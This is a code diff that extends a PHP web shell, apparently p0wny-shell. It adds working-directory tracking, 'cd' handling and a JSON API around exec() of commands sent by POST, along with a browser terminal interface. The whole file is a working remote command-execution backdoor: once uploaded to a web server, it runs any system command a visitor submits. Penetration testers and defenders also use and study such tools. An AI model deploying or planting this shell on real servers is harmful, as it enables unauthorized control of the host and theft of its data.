@@ -1,10 +1,44 @@
 <?php
 
-if ($_GET["feature"] == "shell") {
-    exec($_POST["command"], $stdout);
-    foreach($stdout as $line) {
-        echo $line . "\n";
+function featureShell($cmd, $cwd) {
+    $stdout = array();
+
+    if (preg_match("/^\s*cd\s*$/", $cmd)) {
+        // pass
+    } elseif (preg_match("/^\s*cd\s+(.+)\s*$/", $cmd)) {
+        chdir($cwd);
+        preg_match("/^\s*cd\s+(.+)\s*$/", $cmd, $match);
+        chdir($match[1]);
+    } else {
+        chdir($cwd);
+        exec($cmd, $stdout);
     }
+
+    return array(
+        "stdout" => $stdout,
+        "cwd" => getcwd()
+    );
+}
+
+function featurePwd() {
+    return array("cwd" => getcwd());
+}
+
+if (isset($_GET["feature"])) {
+
+    $response = NULL;
+
+    switch ($_GET["feature"]) {
+        case "shell":
+            $response = featureShell($_POST["cmd"], $_POST["cwd"]);
+            break;
+        case "pwd":
+            $response = featurePwd();
+            break;
+    }
+
+    header("Content-Type: application/json");
+    echo json_encode($response);
     die();
 }
 
@@ -51,6 +85,10 @@ if ($_GET["feature"] == "shell") {
                 color: #75DF0B;
             }
 
+            .shell-prompt > span {
+                color: #1BC9E7;
+            }
+
             #shell-input {
                 display: flex;
                 box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
@@ -63,8 +101,6 @@ if ($_GET["feature"] == "shell") {
                 padding: 0 5px;
                 height: 30px;
                 line-height: 30px;
-                font-weight: bold;
-                color: #75DF0B;
             }
 
             #shell-input > input {
@@ -83,8 +119,52 @@ if ($_GET["feature"] == "shell") {
         <script src="https://code.jquery.com/jquery-3.1.1.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
 
         <script>
-            function execCmd(command) {
-                return $.post("?feature=shell", {command: command}, "text");
+            var CWD = null;
+
+            function featureShell(command) {
+                var eShellContent = document.getElementById("shell-content");
+
+                function _insertCommand(command) {
+                    eShellContent.innerHTML += "\n\n";
+                    eShellContent.innerHTML += `<span class=\"shell-prompt\">${genPrompt(CWD)}</span> `;
+                    eShellContent.innerHTML += escapeHtml(command);
+                    eShellContent.innerHTML += "\n";
+                    eShellContent.scrollTop = eShellContent.scrollHeight;
+                }
+
+                function _insertStdout(stdout) {
+                    eShellContent.innerHTML += escapeHtml(stdout);
+                    eShellContent.scrollTop = eShellContent.scrollHeight;
+                }
+
+                _insertCommand(command);
+                return $.post("?feature=shell", {cmd: command, cwd: CWD}, "json")
+                    .then(response => _insertStdout(response.stdout.join("\n")) || response)
+                    .then(response => updateCwd(response.cwd) || response)
+                    .fail(error => _insertStdout("AJAX ERROR: " + JSON.stringify(error)));
+            }
+
+            function genPrompt(cwd) {
+                cwd = cwd || "~";
+                var shortCwd = cwd;
+                if (cwd.split("/").length > 3) {
+                    var splittedCwd = cwd.split("/");
+                    shortCwd = `…/${splittedCwd[splittedCwd.length-2]}/${splittedCwd[splittedCwd.length-1]}`;
+                }
+                return `p0wny@shell:<span title="${cwd}">${shortCwd}</span>#`
+            }
+
+            function updateCwd(cwd) {
+                if (cwd) {
+                    CWD = cwd;
+                    _updatePrompt();
+                    return;
+                }
+                return $.post("?feature=pwd", {}, "json")
+                    .then(response => CWD = (response.cwd) || response)
+                    .then(response => _updatePrompt() || response)
+                    .fail(error => console.error(error));
+
             }
 
             function escapeHtml(string) {
@@ -94,32 +174,22 @@ if ($_GET["feature"] == "shell") {
                     .replace(/>/g, "&gt;");
             }
 
-            function insertCommand(command) {
-                var eShellContent = document.getElementById("shell-content");
-                eShellContent.innerHTML += "\n";
-                eShellContent.innerHTML += "<span class=\"shell-prompt\">p0wny@shell:~#</span> ";
-                eShellContent.innerHTML += escapeHtml(command);
-                eShellContent.innerHTML += "\n";
-                eShellContent.scrollTop = eShellContent.scrollHeight;
-            }
-
-            function insertStdout(stdout) {
-                var eShellContent = document.getElementById("shell-content");
-                eShellContent.innerHTML += escapeHtml(stdout);
-                eShellContent.innerHTML += "\n";
-                eShellContent.scrollTop = eShellContent.scrollHeight;
+            function _updatePrompt() {
+                var eShellPrompt = document.getElementById("shell-prompt");
+                eShellPrompt.innerHTML = genPrompt(CWD);
             }
 
             function _onShellCmdKeyDown(event) {
                 var eShellCmdInput = document.getElementById("shell-cmd");
                 if (event.key == "Enter") {
-                    insertCommand(eShellCmdInput.value);
-                    execCmd(eShellCmdInput.value)
-                        .then(insertStdout)
-                        .fail(error => insertStdout("AJAX ERROR: " + JSON.stringify(error)));
+                    featureShell(eShellCmdInput.value);
                     eShellCmdInput.value = "";
                 }
             }
+
+            window.onload = function() {
+                updateCwd();
+            };
         </script>
     </head>
 
@@ -136,7 +206,7 @@ if ($_GET["feature"] == "shell") {
                 </div>
             </pre>
             <div id="shell-input">
-                <label for="shell-cmd">p0wny@shell:~#</label>
+                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                 <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
             </div>
         </div>
